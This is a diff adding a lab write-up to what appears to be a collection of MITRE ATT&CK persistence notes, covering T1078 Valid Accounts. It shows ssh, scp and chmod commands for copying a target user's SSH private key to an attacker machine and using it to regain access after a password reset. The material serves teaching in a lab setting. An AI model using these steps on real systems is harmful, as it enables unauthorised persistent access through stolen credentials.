@@ -426,6 +426,62 @@ In this way by running vsftpd service on target we will create Persistence becau
 
 ======================================================completed=======================================
 
+Technique 8: T1078: Valid Accounts
+
+Valid Accounts refers to the usage of valid credentials to bypass access controls placed on various resources on systems 
+within the network. These credentials can even be used to maintain persistent access to systems.
+
+Lab Description: 
+
+In this lab, we are given SSH access on the target machine. The flag is not on the machine yet and will only be 
+available after the "wait" file present in the user home directory is deleted. However, the deletion of this file 
+will change the user password and restart SSH. Hence, to retrieve the flag, we have to maintain access on the target system.
+
+Procedure:
+
+Step1- Login to target server by using provided credentials
+
+ssh student@target_ip
+enter password
+
+Step2-Enumerate files present in home directory
+
+ls -al
+
+Step3-We found that SSH key pair is present in the ".ssh" directory.
+
+Step4-Now exit SSH session and copy ssh private key to attacker machine.
+
+scp student@target_ip:~/.ssh/id_rsa
+enter password
+
+Now fle is successfully copied.
+
+Step5-Now SSH into student machine and delete the wait file.
+
+ssh student@target_ip
+password
+rm wait
+Once "wait" file is deleted, flag is available in target machine but ssh session terminated.
+
+Step6-Now we will SSH into the target machine with the private key.
+
+But firstly we need to change the permission to 400 (The owner of the file has read permission (4) but no write or execute permissions)
+and then will use this file "id_rsa" for ssh.
+
+chmod 400 id_rsa
+ssh -i id_rsa student@target_ip (No need to enter password now)
+
+Successfully login to victim system and search for flag file.
+
+In this way with the help of id_rsa(ssh private key) we can create a persistence on target system.
+
+===========================================completed========================================
+
+
+
+
+
 
 
 
